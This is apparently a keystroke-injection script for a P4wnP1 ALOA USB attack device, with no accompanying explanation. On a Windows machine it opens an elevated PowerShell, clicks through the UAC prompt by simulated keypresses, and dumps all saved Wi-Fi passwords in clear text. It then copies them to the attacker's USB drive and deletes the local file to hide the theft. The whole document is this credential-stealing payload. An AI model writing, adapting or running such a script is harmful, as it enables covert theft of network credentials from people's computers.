
layout("US"); //set US layout

//Natural typing speed (100 ms between keys + additional jitter up to 200 ms)
typingSpeed(25,0);
press("GUI r")
delay(1000)
type("powershell.exe")
delay(1500)
press("CTRL SHIFT ENTER")
delay(1000)
press("LEFT")
delay(500)
press("ENTER")
delay(400)
type("netsh wlan show profiles * key=clear > wirelesspassword.txt\n")
delay(1000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'P4wnP1 ALOA' } | select name \n")
type("copy wirelesspassword.txt $usbpath.name\n")
type("del wirelesspassword.txt ; exit\n")
